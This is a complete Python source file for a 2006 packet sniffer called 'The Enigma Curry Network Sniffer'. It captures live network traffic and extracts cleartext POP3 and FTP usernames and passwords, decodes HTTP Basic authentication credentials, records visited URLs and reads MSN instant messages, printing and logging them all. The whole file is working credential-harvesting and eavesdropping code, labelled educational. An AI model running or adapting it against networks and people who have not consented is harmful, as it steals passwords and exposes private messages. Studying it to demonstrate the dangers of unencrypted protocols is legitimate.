#!/bin/env python
########################################################################
####
#### The Enigma Curry Network Sniffer
#### Copyright (C) 2006 Ryan McGuire
#### ryan@enigma***curry.com (remove ***)
#### version 0.6 
#### January 2006
####
#### Visit www.EnigmaCurry.com
####
#### This program is intended for educational purposes only. However,
#### you are granted all the rights (and responsibilities)
#### conveyed in the following files: README and LICENSE
####
#### The jist is that it's GPL'd. 
####
#######################################################################

__author__    = "Ryan McGuire"
__copyright__ = "Ryan McGuire, 2006"

#System imports
import pcap
import pprint
import sys
import base64
import os
import re
from optparse import OptionParser

#ECSniff local imports
import ipcalc
import packet

#### operation variables
quiet     = False
logging   = False
log       = file
pop3      = False
httpauth  = False
http      = False
msn       = False
ftp       = False
subnet    = None


#########################################################
#### Most connections are more than one packet
#### Keep track of connections across those packets
#########################################################
#pop3 and ftp connections
#a list of tuples of
#(destination_address, source_address, port, username, password)
pop3_ftp_connections = []
#MSN connections
#Whenever we receive an MSN messenger packet that contains a "TypingUser:"
#attribute we'll make an entry in this dictionary IP-->username
#Messages from the local network to MSN servers will not contain the username
#except for in this special attribute, so this is the only way I know how to
#associate a username. If there are multiple accounts used on the same IP
#address, this will probably screw up the name to message association.
msn_connections = {}


def pop3_ftp_logins(p):
    """Capture POP3 or FTP login info.. as far as authentication goes, they're the same

    If it's port 21 assume it's FTP
    If it's port 110 assume it's POP3
    if it's something else, print 'POP3 or FTP'"""
    ip = p.IPpacket
    tcp = p.IPpacket.TCPpacket
    #figure out protocol
    if tcp.destination_port == 110:
        proto = "POP3"
    elif tcp.destination_port == 21:
        proto = "FTP"
    else:
        proto = "POP3 or FTP"
    try:
        if tcp.payload[0:4] == "USER":
            #Oh boy, someone's logging in
            #The username is in the form of "USER joe\r\n"
            #so start at index 5 (after 'USER ') and end at -2 (before '\r\n')
            user = tcp.payload[5:-2]
            #record the connection for later use
            pop3_ftp_connections.append( (
                ip.destination_address, ip.source_address,
                tcp.destination_port,user,"") )
        elif tcp.payload[0:4] == "PASS":
            #They even sent their password!
            pwd = tcp.payload[5:-2]
            #check to see if there is a possible previous connection we
            #can match this password up to.
            connection_index = 0
            for conn in pop3_ftp_connections:
                if conn[0] == ip.destination_address and \
                             conn[1] == ip.source_address and \
                             conn[2] == tcp.destination_port:
                    #this is probably the right connnection then.
                    event = "%s: %s:%s --> %s:%s  [ user=%s, pass=%s ]" % \
                          (proto,ip.source_address,tcp.source_port,
                           ip.destination_address,tcp.destination_port,
                           conn[3], pwd)
                    if not quiet: print event
                    if logging: log.write(event + "\n")
                    #delete the connection
                    del pop3_ftp_connections[connection_index]
                    return
                connection_index += 1
        else:
            return
    except IndexError:
        return

def http_accesses(p, logAuth=False):
    ip=p.IPpacket
    tcp = p.IPpacket.TCPpacket
    try:
        if tcp.payload[0:3] == "GET":
            get = tcp.payload.split('\r\n')
            page = tcp.payload[4:].split(" ")[0]
            host = ""
            gotAuth = False #found user and pass?
            for line in get:
                if line[0:5] == "Host:":
                    host = "http://" + line[6:]
                if line[0:20] == "Authorization: Basic":
                    auth = base64.decodestring(line[21:])
                    auth = auth.split(":")
                    user,pwd = auth[0],auth[1]
                    gotAuth = True
            if logAuth and gotAuth:
                event = "http: %s:%s --> %s  [ user=%s, pass=%s ]" % \
                        (ip.source_address,tcp.source_port,
                         host+page, user, pwd)
            else:
                event = "http: %s:%s --> %s" % \
                        (ip.source_address,tcp.source_port,
                         host+page)
            if not quiet: print event
            if logging: log.write(event + "\n")
            return True
    except IndexError:
        return


def msn_messages(p):
    ip = p.IPpacket
    tcp = p.IPpacket.TCPpacket
    try:
        lines = tcp.payload.split("\r\n")
        #Check if this is a USR response
        #If it is, we can get the local user's username.
        usrregex=re.compile("^USR [0-9]* OK")
        if usrregex.search(lines[0]):
            parts=lines[0].split(" ")
            user = parts[3]
            #Record the username for future use.
            msn_connections[ip.destination_address] = user
        if tcp.payload[0:3] == "MSG":
            #this could be an incoming or an outgoing message.
            #Incoming messages contain the username.
            #Outgoing ones do not
            #(except in TypingUser attributes which we'll use later)
            possibly_user = tcp.payload[4:].split(" ")[0]
            if "@" in possibly_user:
                user = possibly_user
            else:
                user = None
            #If the user == None, this is probably an outgoing packet
            #as they don't contain the username.
            #Let's see if we can get the username via the TypingUser attribute
            if user == None:
                for line in lines:
                    if line[0:11] == "TypingUser:":
                        possibly_user = line[12:]
                    if "@" in possibly_user:
                        user = possibly_user
                        #record the user in the msn_connections dict
                        msn_connections[ip.source_address] = user
                        #We won't be processing any message this time
                        #But since we recorded the username, we'll
                        #have it for when they actually send the
                        #message.
                        return 
            #The MSG command is used for lots of things in the MSN protocol.
            #Not only for actual instant messages.
            #True instant messages will have a
            #Content-Type: text/plain in the header
            gotten_past_header = False
            good_content = False
            message = ""
            for line in lines:
                #Skip past the header
                if gotten_past_header == False or good_content == False:
                    if line[0:24] == "Content-Type: text/plain":
                        good_content = True
                    elif line == "":
                        gotten_past_header = True
                else:
                    #We're past the header
                    #Get any more lines as the message
                    message += line + "\n"
            #If we don't have the username, see if we have it in the
            #msn_connections dict. We append 'Probably' to the end
            #because we cannot be 100% sure that this is the user.
            #If you have multiple clients on the exact same IP
            #address, there is no definitive way to tell...
            #At least this author cannot figure a way..
            if user == None:
                if msn_connections.has_key(ip.source_address):
                    user = msn_connections[ip.source_address] + " (Probably)"
            #We should now have the username and the message
            #Print the message
            if message != "":
                print "MSN: from    : %s\n     message : %s" % (user, message)
    except IndexError:
        return

def process_packet(packet_length, data, timestamp):
    if not data:
        return
    p = packet.Packet(data)
    if p.IPpacket:
        if p.IPpacket.TCPpacket:
            source_port = p.IPpacket.TCPpacket.destination_port
            already_done_http = False
            if subnet:
                if not (ipcalc.ip_in_network(p.IPpacket.source_address,subnet) or \
                        ipcalc.ip_in_network(p.IPpacket.destination_address,subnet)):
                    #We don't care about this packet as it's not from nor
                    #to the subnet the user specified.
                    return
            #check each protocol:
            if pop3 or ftp:
                pop3_ftp_logins(p)
            if httpauth:
                if http_accesses(p,logAuth=True) == True:
                    already_done_http = True
            if http and not already_done_http:
                http_accesses(p)
            if msn:
                msn_messages(p)
            

if __name__ == "__main__":

    parser = OptionParser(version="%prog 0.6")
    parser.add_option("--subnet",dest="subnet",
                      metavar="IP/netmask",
                      help="Only display data for a specific subnet.\neg: 192.168.0.1/24 or 192.168.0.1/255.255.255.0")
    parser.add_option("--pop3",dest="pop3",
                      action="store_true",default=False,
                      help="Log POP3 usernames and passwords")
    parser.add_option("--httpauth",dest="httpauth",
                      action="store_true",default=False,
                      help="Log HTTP usernames and passwords")
    parser.add_option("--http",dest="http",
                      action="store_true",default=False,
                      help="Log HTTP/WWW page accesses")
    parser.add_option("--msn",dest="msn",
                      action="store_true",default=False,
                      help="Log MSN messenger messages")
    parser.add_option("--ftp",dest="ftp",
                      action="store_true",default=False,
                      help="Log FTP usernames and passwords")
    parser.add_option("-e","--everything",dest="everything",
                      action="store_true",default=False,
                      help="Log Everything")    
    parser.add_option("-d","--device",dest="device",
                      help="device to sniff (eth0, wlan0 etc)",
                      metavar="device")
    parser.add_option("-l","--log",dest="log",
                      help="log results to file",
                      metavar="file")
    parser.add_option("-q","--quiet",dest="quiet",
                      action="store_true",default=False,
                      help="don't display events on stdout")
    (options, args) = parser.parse_args()

    if options.device:
        opts = 0
        if options.pop3:
            pop3 = True
            opts += 1
        if options.httpauth:
            httpauth = True
            opts += 1
        if options.msn:
            msn = True
            opts += 1
        if options.http:
            http = True
            opts += 1
        if options.ftp:
            ftp = True
            opts += 1
        if options.everything:
            opts += 1
            pop3     = True
            httpauth = True
            msn      = True
            http     = True
            ftp      = True
        if opts < 1:
            print "\nYou have to specify the operation to perform\n" + \
                  "See --help for details.\n"
            sys.exit(1)
        if options.log:
            if os.path.isfile(options.log):
                print "Log file already exists. Choose a new file"
                sys.exit(1)
            log = open(options.log,"w")
            logging = True
        if options.quiet:
            quiet = True
        if options.subnet:
            subnet = options.subnet
        p = pcap.pcapObject()
        try:
            p.open_live(options.device,2000,1,200)
        except Exception:
            print "You don't have permission to read %s" % options.device
            sys.exit(1)
        try:
            while 1:
                p.dispatch(1, process_packet)
        except KeyboardInterrupt:
            print "Keyboard inturrupt. Exiting.."
            if logging:
                log.flush()
                log.close()
            sys.exit(0)
    else:
        print "\nUse --help to display usage information\n"
        sys.exit(1)

